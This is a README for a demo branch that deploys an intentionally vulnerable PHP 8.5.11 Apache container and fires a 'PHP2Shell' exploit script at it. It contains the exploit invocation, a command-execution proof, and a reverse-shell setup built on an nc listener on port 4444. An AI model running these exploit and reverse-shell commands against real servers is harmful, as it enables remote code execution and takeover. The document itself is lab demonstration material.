# PHP2Shell demo target (branch: php2shell-demo)

This branch replaces the Laravel build with a deliberately-vulnerable demo
target: PHP 8.5.11 (built the day before the 2026-10-21 security fix), Apache
mod_php pinned to ONE prefork worker, lab php.ini. `main` is untouched.

## Deploy (once, in Coolify UI — ~3 minutes)

1. Coolify → New Resource → **Dockerfile** → select this repo, **branch
   `php2shell-demo`**, Dockerfile location `/Dockerfile`.
2. Port: container port **80**; enable a **public port** — pick a random high
   number (e.g. 39486). Do NOT attach a domain with TLS (the tool speaks
   plain HTTP).
3. Optional nice URL: add an A record `php-demo.mohamedameen.in → VPS IP`
   with **DNS only (grey cloud)**, then the target is
   `http://php-demo.mohamedameen.in:39486/`.
4. Deploy. Visit the URL — you should see the "Ameen Demo Service" status
   page showing `PHP 8.5.11 · apache2handler`.

## Fire (from the Mac, or anywhere)

```bash
cd ~/Developer/schoology/php2shell-demo/public-poc
python3 exploit.py -u http://TARGET:39486/index.php --version 8.5.11 -c 'id>pwn'
curl http://TARGET:39486/pwn      # → uid=33(www-data)  ← proof, over HTTP
```

Interactive shell (listener on the Mac: `nc -lvn 4444`, Mac must be reachable
from the VPS — public IP or port-forward; or run the listener on the VPS
itself over SSH and watch it there):

```bash
# plant on target (via the tool):  -c 'echo id>/tmp/c'   (or docker/SSH exec)
# fire:                            -c 'bash</tmp/c'      (payload calls your listener)
```

## After the demo

Delete the resource (or switch it back) and delete this branch:
`git push origin --delete php2shell-demo`. This container is INTENTIONALLY
vulnerable and internet-exposed — keep it up only for the session.
